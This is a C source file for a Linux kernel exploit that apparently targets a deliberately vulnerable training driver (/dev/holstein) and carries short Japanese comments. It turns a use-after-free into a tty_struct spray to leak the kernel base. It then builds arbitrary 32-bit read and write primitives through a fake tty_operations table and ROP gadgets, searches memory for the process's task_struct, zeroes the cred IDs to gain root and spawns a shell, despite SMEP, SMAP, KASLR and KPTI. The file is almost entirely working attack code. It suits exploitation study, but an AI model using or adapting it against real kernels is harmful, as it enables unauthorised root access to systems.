/**
 * uaf-aaw-poweroff:
 *   - SMEP is enabled
 *   - SMAP is enabled
 *   - KASLR is enabled
 *   - KPTI is enabled
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <unistd.h>

unsigned long kbase, g_buf, current;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

#define ofs_tty_ops 0xc39c60
#define rop_mov_prdx_rcx (kbase + 0x1b2d06)     // mov qword [rdx], rcx; ret;
#define rop_mov_eax_prdx (kbase + 0x4469e8)     // mov eax, qword [rdx]; ret;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int fd1, fd2;
int spray[50];
char buf[0x400];
int cache_fd = -1;
int set_read = 0;
int set_write = 0;

void AAW32(unsigned long addr, unsigned int val) {
  if (cache_fd == -1 || !set_write) {
    // fake tty_operations
    *(unsigned long*)&buf[0x3f8] = rop_mov_prdx_rcx;
    *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
    write(fd2, buf, 0x400);
    set_write = 1;
  }
  
  if (cache_fd == -1) {
    for (int i = 0; i < 50; i++) {
      int v = ioctl(spray[i], val /* rcx */, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
	break;
      }
    }
  } else {
    ioctl(cache_fd, val /* rcx */, addr /* rdx */);
  }
}

unsigned int AAR32(unsigned long addr) {
  if (cache_fd == -1 || !set_read) {
    // fake tty_operations
    *(unsigned long*)&buf[0x3f8] = rop_mov_eax_prdx;
    *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
    write(fd2, buf, 0x400);
    set_read = 1;
  }

  // mov eax, [rdx]; ret;
  if (cache_fd == -1) {
    for (int i = 0; i < 100; i++) {
      int v = ioctl(spray[i], 0, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
        return v;
      }
    }
  } else {
    return ioctl(cache_fd, 0, addr /* rdx */);
  } 
}

int main() {
  save_state();

  // First use-afer-free. This controlled tty_struct object will be used
  // to store the fake stack and the RIP control address (tty_operations)
  fd1 = open("/dev/holstein", O_RDWR);
  fd2 = open("/dev/holstein", O_RDWR);
  if (fd1 == -1 || fd2 == -1)
    fatal("/dev/holstein");
  close(fd1);

  // tty_struct spray
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  // KASLRの回避
  read(fd2, buf, 0x400);
  kbase = *(unsigned long*)&buf[0x18] - ofs_tty_ops;
  g_buf = *(unsigned long*)&buf[0x38] - 0x38;
  printf("kbase = 0x%016lx\n", kbase);
  printf("g_buf = 0x%016lx\n", g_buf);

  // task_structの探索
  if (prctl(PR_SET_NAME, "nekomaru") != 0)
    fatal("prctl");
  unsigned long addr;
  for (addr = g_buf - 0x1000000; ; addr += 0x8) {
    if ((addr & 0xfffff) == 0)
      printf("searching... 0x%016lx\n", addr);

    if (AAR32(addr) == 0x6f6b656e                  // "oken"
        && AAR32(addr+4) == 0x7572616d) {          // "uram"
      printf("[+] Found 'comm' at 0x%016lx\n", addr);
      break;
    }
  }

  unsigned long addr_cred = 0;
  addr_cred |= AAR32(addr - 8);
  addr_cred |= (unsigned long)AAR32(addr - 4) << 32;
  printf("[+] current->cred = 0x%016lx\n", addr_cred);

  // 実効IDの上書き
  for (int i = 1; i < 9; i++) {
    AAW32(addr_cred + i*4, 0); // id=0(root)
  }

  puts("[+] pwned!");
  system("/bin/sh");

  return 0;
}
